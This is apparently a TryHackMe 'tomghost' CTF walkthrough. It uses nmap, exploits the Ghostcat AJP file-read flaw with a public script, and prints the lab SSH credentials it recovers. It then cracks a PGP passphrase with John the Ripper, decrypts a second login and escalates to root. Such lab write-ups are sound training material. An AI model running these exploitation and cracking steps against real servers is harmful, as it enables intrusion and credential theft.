![image](https://user-images.githubusercontent.com/87468669/209873051-4c188727-24e2-44e3-be32-b6668718d654.png)

First we start with an nmap scan

`nmap -sC -V -T4 -oN nmap.txt <IP>`

```
# Nmap 7.93 scan initiated Wed Dec 28 21:01:35 2022 as: nmap -sC -sV -T4 -oN quickmap.txt -Pn 10.10.193.3
Nmap scan report for 10.10.193.3
Host is up (0.19s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 28 21:02:48 2022 -- 1 IP address (1 host up) scanned in 72.87 seconds
```

nice we got some interesting ports available, let's start by enumearting port 8080 http.

![image](https://user-images.githubusercontent.com/87468669/209873240-6e4be718-1641-4fc8-ab67-917241f5e7fc.png)

Great the web server is running apache tomcat. Next we enumerate port 8009 ajp13.

Ajp13 (Apache Jserv Protocol) protocol is packet-oriented TCP protocol, by default this service runs on port 8009. AJP13 protocol is a binary format, which is intended for better performance over the HTTP protocol running over TCP port 8080.

What is Ghostcat `CVE-2020–1938` vulnerability?

This is an LFI vulnerability in AJP service. An attacker can exploit Ghostcat vulnerability and read the contents of configuration files and source code files of all webapps deployed on Tomcat.

For example, the /WEB-INF/web.xml file is the Web Root directory who’s access is restricted and cannot be accessed by anyone over HTTP Tomcat server.

![image](https://user-images.githubusercontent.com/87468669/209873669-e2ee0683-3893-4fa2-8397-3546fe0f3060.png)

By exploiting the Ghostcat [CVE-2020–1938] vulnerability, it is possible to read contents of the files in the Web server directory from AJP13 protocol (LFI vulnerability). In this case we will be exploiting this vuln through the /WEB-INF/web.xml. Now let's search for exploit to use on this target.

![image](https://user-images.githubusercontent.com/87468669/209873999-b011b622-c8ad-4d8f-9608-81ae7668fdf9.png)

Found a github exploit, [[exploit]](https://github.com/doggycheng/CNVD-2020-10487) let's clone and run the exploit.

```
python CNVD-2020-10487-Tomcat-Ajp-lfi.py -p 8009 -f "/WEB-INF/web.xml" 10.10.193.3
```

![image](https://user-images.githubusercontent.com/87468669/209874348-5a291d1e-b2a7-42e0-bba6-2563ad226955.png)

Nice we got creds, let's try ssh using the creds `skyfuck:8730281lkjlkjdqlksalks`

![image](https://user-images.githubusercontent.com/87468669/209874968-02e9802e-ff66-4207-bea7-bcf2c8716dbb.png)

Bull's eye we logged in ssh. now let's esc privs.

![image](https://user-images.githubusercontent.com/87468669/209875360-cc2a5378-cebd-4747-a9b2-3d8426a26268.png)

got some file in skyfuck directory, reading the tryhackme.acs contain a pgp key, 

![image](https://user-images.githubusercontent.com/87468669/209875695-8249fa85-9871-4019-91d6-9465800b57da.png)

Download the file into our attacker box from target... now let's check for passphrase

```
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/tomghost]
└─$ gpg2john tryhackme.asc > hash.txt

File tryhackme.asc
                                                                                                                                                                      
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/tomghost]
└─$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
No password hashes left to crack (see FAQ)
                                                                                                                                                                      
┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/THM/tomghost]
└─$ john --show hash.txt                             
tryhackme:alexandru:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc

1 password hash cracked, 0 left

```

![image](https://user-images.githubusercontent.com/87468669/209876035-b24205fb-dd8b-470c-9439-7fdd8051bf97.png)

Got the passphrase for the gpg key `alexandru`. now let's import secret key

```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
skyfuck@ubuntu:~$ gpg --allow-secret-key-import --import tryhackme.asc 
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123jskyfuck@ubuntu:~$ 
skyfuck@ubuntu:~$ 
skyfuck@ubuntu:~$ 
```

![image](https://user-images.githubusercontent.com/87468669/209877917-ea8fb311-d4f7-40a2-94e7-59d3a12b06a4.png)

great got merlin creds, now let's su into user merlin.

![image](https://user-images.githubusercontent.com/87468669/209879164-3065e3d2-9fbe-476d-b35c-6846804f2d91.png)

now let's check gtfobins for exploit.

![image](https://user-images.githubusercontent.com/87468669/209879565-233632ca-2530-4f26-8dbd-532229502f7b.png)

run that command 

![image](https://user-images.githubusercontent.com/87468669/209880220-6d4138bb-133c-48ca-b4ce-3ebe928b94c7.png)

Boom!!! we are root😎😎











